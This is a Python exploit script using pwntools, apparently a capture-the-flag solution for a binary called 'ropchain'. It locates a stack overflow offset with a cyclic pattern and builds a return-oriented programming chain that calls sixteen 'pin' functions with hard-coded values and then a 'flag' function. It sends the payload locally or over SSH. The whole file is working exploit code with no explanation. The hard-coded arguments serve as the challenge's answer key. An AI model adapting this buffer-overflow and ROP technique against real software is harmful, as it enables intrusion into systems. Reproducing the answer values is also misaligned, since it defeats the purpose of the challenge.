from pwn import *
import argparse
import os

EXECUTABLE = "ropchain"
LOCAL_PATH = "./"
REMOTE_PATH = ""
SSH_SERVER = ""

def get_process_path(is_ssh = False):
    if is_ssh or os.path.exists(REMOTE_PATH):
        return REMOTE_PATH + EXECUTABLE
    else:
        return LOCAL_PATH + EXECUTABLE

def get_process(ssh_user = None):
    is_ssh = ssh_user is not None
    path = get_process_path(is_ssh)
    params = {"argv": path, "cwd": os.path.dirname(path)}
    if is_ssh:
        s = ssh(host=SSH_SERVER, user=ssh_user)
        p = s.process(**params)
    else:
        p = process(**params)
    return p

def send_payload(proc, payload):
    proc.sendlineafter("exploit me... if you dare> ", payload)

def get_overflow_offset():
    print("inside getoverflowoffset")
    proc = process(get_process_path())
    payload = cyclic(128)
    print(str(payload))
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.eip)
    log.info("Overflow offset: {}".format(offset))
    return offset


parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssh_user", help="Connect via SSH with the given username")
args = parser.parse_args()

e = ELF(get_process_path())
context.binary = e.path


r = ROP(e)
r.call(e.symbols["pin0"], [486500720])
r.call(e.symbols["pin1"], [275520021])
r.call(e.symbols["pin2"], [426205723])
r.call(e.symbols["pin3"], [346622451])
r.call(e.symbols["pin4"], [530504787])
r.call(e.symbols["pin5"], [679224379])
r.call(e.symbols["pin6"], [313914797])
r.call(e.symbols["pin7"], [592250779])
r.call(e.symbols["pin8"], [814938755])
r.call(e.symbols["pin9"], [711443699])
r.call(e.symbols["pin10"], [60891780])
r.call(e.symbols["pin11"], [420443403])
r.call(e.symbols["pin12"], [901672414])
r.call(e.symbols["pin13"], [347094641])
r.call(e.symbols["pin14"], [998782392])
r.call(e.symbols["pin15"], [623405731])
r.call(e.symbols["flag"], [0])

print("ROP:")
print(r.dump())

offset = get_overflow_offset()

p = get_process(args.ssh_user)
payload = fit({offset: r.chain()})
print(hexdump(payload))
send_payload(p, payload)
print(p.recvall())